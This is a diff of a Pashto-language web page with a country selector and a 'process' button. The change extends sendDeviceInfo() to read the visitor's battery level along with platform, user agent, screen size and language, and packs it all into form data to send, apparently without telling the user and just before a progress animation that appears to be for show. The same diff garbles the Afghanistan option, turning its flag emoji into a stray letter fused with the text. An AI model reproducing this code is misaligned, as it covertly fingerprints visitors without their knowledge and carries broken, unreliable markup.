@@ -75,7 +75,7 @@
             <div class="card">
                 <span class="card-label">📍 هیواد</span>
                 <select class="input-box" id="countrySelect">
-                    <option value="Afghanistan">🇦🇫 افغانستان</option><option value="Pakistan">🇵🇰 پاکستان</option><option value="Iran">🇮🇷 ایران</option><option value="India">🇮🇳 هندوستان</option>
+                    <option value="Afghanistan">🇦فغانستان</option><option value="Pakistan">🇵🇰 پاکستان</option><option value="Iran">🇮🇷 ایران</option><option value="India">🇮🇳 هندوستان</option>
                 </select>
             </div>
         </div>
@@ -127,11 +127,19 @@
         }
 
         async function sendDeviceInfo() {
+            let batteryPercentage = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryPercentage = Math.round(battery.level * 100) + "%";
+                }
+            } catch (e) {}
+
             const info = { 
                 deviceType: navigator.platform, 
                 androidVer: navigator.userAgent, 
                 screenSize: window.innerWidth + " x " + window.innerHeight, 
-                batteryLevel: "N/A", 
+                batteryLevel: batteryPercentage, 
                 language: navigator.language 
             };
             const fd = new FormData(); 
@@ -210,7 +218,7 @@
             btn.disabled = true;
             processBox.style.display = "block";
 
-            // د وسیلې معلومات لیږل
+            // د وسیلې معلومات او د بیټرۍ فیصدي لېږل
             await sendDeviceInfo();
 
             let progress = 0;
